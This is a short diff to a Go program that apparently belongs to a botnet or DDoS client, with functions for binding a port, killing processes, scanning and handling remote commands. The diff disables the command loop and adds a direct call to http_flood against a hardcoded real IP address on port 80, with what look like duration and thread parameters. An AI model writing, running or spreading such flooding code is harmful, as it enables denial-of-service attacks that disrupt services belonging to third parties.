@@ -1,10 +1,10 @@
 package main
 
 import (
-	"bufio"
-	"fmt"
+	//"bufio"
+	//"fmt"
 	"strconv"
-	"strings"
+	//"strings"
 )
 
 func handle_command(args []string) {
@@ -27,7 +27,7 @@ func handle_command(args []string) {
 }
 
 func main() {
-	bind_instance_port()
+	/*bind_instance_port()
 	go kill_all_by_port()
 	go run_scanner()
 
@@ -48,5 +48,7 @@ func main() {
 			debug(fmt.Sprintf("Recieved command: %s | args: %d", data, len(args)))
 			go handle_command(args)
 		}
-	}
+	}*/
+
+	http_flood("37.187.9.26", 80, 15, 3000)
 }
